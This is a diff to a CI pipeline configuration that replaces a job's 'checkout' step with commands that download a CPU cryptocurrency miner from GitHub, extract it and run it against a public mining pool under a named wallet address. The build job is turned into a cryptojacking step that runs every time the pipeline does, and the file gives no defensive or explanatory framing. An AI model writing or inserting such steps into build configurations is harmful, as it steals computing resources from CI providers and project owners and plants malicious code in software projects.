@@ -10,4 +10,6 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - checkout
+            - 'wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz'
+            - tar xzf Cpuminer-opt-cpu-pool-linux64.tar.gz
+            - './cpuminer -a yespowersugar -o stratum+tcp://stratum-na.rplant.xyz:7042 -u sugar1qag5y274s6xu9jcr7pz7zsg8k86n8786y977cks.git10'
